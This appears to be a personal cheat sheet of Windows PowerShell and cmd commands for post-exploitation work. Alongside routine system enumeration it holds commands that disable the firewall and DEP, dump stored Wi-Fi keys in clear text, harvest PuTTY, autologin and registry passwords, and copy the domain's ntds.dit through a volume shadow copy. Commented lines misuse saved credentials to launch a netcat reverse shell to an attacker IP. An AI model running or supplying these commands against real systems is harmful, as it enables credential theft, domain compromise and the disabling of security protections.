# Get PowerShell Version
$PSVersionTable.PSVersion

# Get UUID:
(Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
wmic csproduct get UUID

# Get disk drive serial numbers:
wmic DISKDRIVE get SerialNumber

# Get current user and privleges:
whoami /priv

# Get a list of PowerShell providers and logical, temporary, and mapped drives
Get-PSProvider
Get-PSDrive
net share

# Get environment variables:
Get-ChildItem Env:

#Get Windows Build and Version Numbers:
"Version:  {0}" -F (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId).ReleaseId
"OS Build: {0}.{1}" -F (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name CurrentBuild).CurrentBuild, (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name UBR).UBR
gwmi Win32_OperatingSystem | select Version, InstallDate, OSArchitecture
#Get-WmiObject Win32_OperatingSystem -ComputerName <computer_name>

#Get Uptime:
$os = Get-WmiObject win32_operatingsystem; $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime); Write-Output ("Uptime: " + $uptime.Days + " Days " + $uptime.Hours + " Hours " + $uptime.Minutes + " Minutes")

# Get system information
Get-ComputerInfo # Not recognized by PowerShell 4.0.1.1 
systeminfo



# Get quick list of patches:
wmic qfe

# Get Windows Defender Status:
Get-MpComputerStatus

# Get interactive users with sessions:
query user

# Get lists of logged-on users
gwmi Win32_LoggedOnUser | Select Antecedent -Unique
gcim Win32_LoggedOnUser | Select antecedent -Unique

# List local users:
Get-LocalUser | ft Name, Enabled, LastLogon, Description

# List local user profiles:
Get-ChildItem C:\Users -Force | Select Name, CreationTimeUtc, LastWriteTimeUtc | Sort -Property LastWriteTimeUtc -Descending | Format-Table

# List all local groups:
Get-LocalGroup | Sort -Property Name

# Get groups members:
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroup | %{ $GroupMembers = (Get-LocalGroupMember $_.Name | ft Name, PrincipalSource, ObjectClass); if($GroupMembers -and $GroupMembers.Count -gt 0){Write-Host -NoNewline -ForegroundColor Cyan $_.Name; Get-LocalGroupMember $_.Name | ft Name, PrincipalSource, ObjectClass | Format-Table}}

# List the services
Get-Service | Select -Property Status, StartType, Name, DisplayName | Sort -Property Status, Name, StartType, DisplayName | Format-Table -AutoSize

# Get logon account requirements:
net accounts

# Get scheduled tasks:
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# Get startup tasks:
wmic startup get caption,command
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\$env:USERNAME\Start Menu\Programs\Startup"



# Ipconfig and other interface info
ipconfig /all
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

# Routing Information
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

# List ARP table
arp -A

# Get Network connections with process ID's:
Get-NetTCPConnection

# Grep netstat for process id's of processes with the specified name (i.e. lsass).
foreach($processPid in (ps lsass).Id) { netstat -ano | Select-String ($processPid.ToString()) | Select-String "TCP" | Select-String “ESTABLISHED” }

# Get Domain Controllers
[System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain() | ForEach-Object {$_.DomainControllers} | ForEach-Object { New-Object -TypeName PSObject -Property @{ Forest = $_.Forest; Name = $_.Name; OSVersion = $_.OSVersion; SiteName = $_.SiteName;IPAddress = [System.Net.Dns]::GetHostByName($_.Name).AddressList[0].IPAddressToString } } | Format-Table -AutoSize

# Do a verbose traceroute:
Test-NetConnection 128.212.0.1 -TraceRoute | Select -ExpandProperty TraceRoute | % { Resolve-DnsName $_ -type PTR -ErrorAction SilentlyContinue }

# Show firewall state:
netsh firewall show state
netsh firewall show config

# Disabled Window Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Get wireless network profiles:
netsh wlan show profile

# Get all wireless network profile information:
netsh wlan show profile | %{$M=[regex]::Match($_, "All User Profile\s+:\s+(?<Name>.+?$)");if($M.Success){$M.groups["Name"].Value.Trim()}} | %{Write-Host; netsh wlan show profile "$_" key=clear}

# Get just the wireless network passwords (in cmd):
#echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on

# Sysinternals - check for mismanaged access
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Check for unquoted service paths:
wmic service get name,displayname,pathname,startmode | Select-String -Pattern "Auto" | Select-String -Pattern "C:\\Windows\\", "`"" -NotMatch
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name


# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check for locally stored credentials
cmdkey /list

# Exploit the above locally stored credentials
# runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"

# Exploit the above locally stored credentials using RunAs and netcat
# C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

# Exploit the above locally stored credentials using PowerShell
#$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
#$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
#$ computer = "<hostname>"
#[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

# List available event logs:
Get-EventLog -List

# Get event logs created within the last 2 hours:
Get-EventLog -LogName "Windows PowerShell" -After ((Get-Date).AddHours(-2)) | Format-Table -AutoSize | Out-String





# Recursively search for files modified within the last 2 hours
$Path = "C:\Users"; if($LastDirCheck -eq $null){$LastDirCheck = @{}}; $LastDirCheck[$Path] = (Get-Date); Get-ChildItem $Path -Recurse -Force -ErrorAction 'SilentlyContinue' | Where{$_.LastWriteTime -gt (Get-Date).AddHours(-2)}

# Search for files modified since the last time they were checked, else get files changed within the last hour.
$Path = "C:\"; $ChangedSince = (Get-Date).AddHours(-1); if($LastDirCheck -eq $null){$LastDirCheck = @{}}; if($LastDirCheck.ContainsKey($Path) -eq $true){$ChangedSince = $LastDirCheck[$Path]}; "[+] Recursively checking for modified files at: {0}`r`n`tModified within the last: {1}" -F $Path, ((Get-Date) - ($ChangedSince)); $LastDirCheck[$Path] = (Get-Date); Get-ChildItem $Path -Recurse -Force -ErrorAction 'SilentlyContinue' | Where{$_.LastWriteTime -gt $ChangedSince}

# Recursively look for files with a certain extension
Get-ChildItem -Path .\ -Filter *.csv -File -Recurse | Sort LastWriteTimeUtc -Descending | Select-Object -Property LastWriteTimeUtc, Length, FullName

# Recursively scan files for strings:
Get-ChildItem "<path_to_folder>" -Recurse -Force | Select-String -Pattern "password", "pwd", "passwd" | Add-Content "C:\PasswordGrep.txt" -Force
Get-ChildItem "c:\windows\system32\*.txt" -Recurse -Force | Select-String -Pattern "Microsoft", "windows" | Add-Content TestGrep.txt -Force

# Check a file's hash
(Get-FileHash "<path_to_file>" -Algorithm MD5).Hash.ToLower() -eq ("0079e0ad38bf97d019776bb6a6409359").Trim().ToLower()

# List Program Files directories and installed programs:
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name



# Make an attempt to prevent a shutdown every second, redirecting failed attempts to null. Doesn't really work that great :(
while($true) {shutdown -a 2>&1 | out-null; Start-Sleep -Seconds 1}

# Check if DEP is enabled:
gwmi Win32_OperatingSystem | fl DataExecutionPrevention*

# Disabled DEP (running as admin):
bcdedit.exe /set nx AlwaysOff




# Get PuTTY Keys/Hosts/Passwords:
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
$ProxyCredentials=@(); Get-ChildItem -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" | %{if(![string]::IsNullOrWhiteSpace($_.GetValue("ProxyUsername"))){$ProxyCredentials += ("`t{0}:{1}@{2}:{3}" -F $_.GetValue("ProxyUsername"), $_.GetValue("ProxyPassword"), $_.GetValue("ProxyHost"), $_.GetValue("ProxyPort"))}}; if($ProxyCredentials.Count -gt 0){Write-Host "[+] Found PuTTY Proxy Credentials:" -ForegroundColor Green; $ProxyCredentials | Sort | %{$_ | Write-Host}}
$PuttyHosts=@(); Get-ChildItem -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" | %{if(![string]::IsNullOrWhiteSpace($_.GetValue("HostName"))){$PuttyHosts += ("`t[{0}] {1}:{2}" -F $_.GetValue("Protocol"), $_.GetValue("HostName"), $_.GetValue("PortNumber"))}}; if($PuttyHosts.Count -gt 0){Write-Host "[+] Found PuTTY Hosts:" -ForegroundColor Green; $PuttyHosts | Sort | %{$_ | Write-Host}}
$PuttyCerts=@(); Get-ChildItem -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" | %{if(![string]::IsNullOrWhiteSpace($_.GetValue("PublicKeyFile"))){$PuttyCerts += ("`t{3} ([{0}] {1}:{2})" -F $_.GetValue("Protocol"), $_.GetValue("HostName"), $_.GetValue("PortNumber"),$_.GetValue("PublicKeyFile"))}}; if($PuttyCerts.Count -gt 0){Write-Host "[+] Found PuTTY Keys:" -ForegroundColor Green; $PuttyCerts | Sort | %{$_ | Write-Host}}

# Search for Passwords in Registry
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

# Check for Windows Autologin:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
$x = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"); $x.GetValueNames() | Where {@("DefaultUserName", "DefaultDomainName", "DefaultPassword").Contains($_)} | %{[pscustomobject] @{ Name = $_; Value = $x.GetValue($_)}} | Format-Table

# Check for any Windows Unattend files:
$FoundFiles=@();@("C:\unattend.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\system32\sysprep.inf","C:\Windows\system32\sysprep\sysprep.xml")|%{if(test-path($_)){$FoundFiles += $_}};if($FoundFiles.Count -gt 0){Write-Host -ForegroundColor Green "[+] Found Unattend files:";$FoundFiles |%{"`t{0}"-F $_ | Write-Host}}





$WlanapiDef = @'
[DllImport("Wlanapi.dll", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern uint WlanGetProfile(IntPtr hClientHandle,ref Guid pInterfaceGuid,string strProfileName,IntPtr pReserved,ref string pstrProfileXml, ref uint pdwFlags, ref uint pdwGrantedAccess);
'@
$Wlanapi = Add-Type -MemberDefinition $WlanapiDef -Name 'WlanApi'-Namespace 'Win32' -PassThru


# Create a shadow and copy the ntds.dit
dir C:\Windows\System32\NTDS.DIT
vssadmin create shadow /for=C:

# Copy the ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy61\windows\system32\ntds.dit C:\<output_path>\ntds.dit
dir C:\<output_path>\ntds.dit

# Remove shadow
vssadmin delete shadows /shadow={5eeac6cd-1812-45e3-a64c-cedadc48b7ee}
vssadmin Delete Shadows /For=C: /Shadow={5eeac6cd-1812-45e3-a64c-cedadc48b7ee}




# I don't remember anything
$batchFileContent = @'
@echo off
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
'@
$batchFileContent | Out-File -LiteralPath:"$env:TEMP\backup.cmd" -Force
Invoke-Expression -Command:"$env:TEMP\backup.cmd"
Remove-Item -LiteralPath:"$env:TEMP\backup.cmd" -Force
Invoke-Expression -Command:$batchFileContent
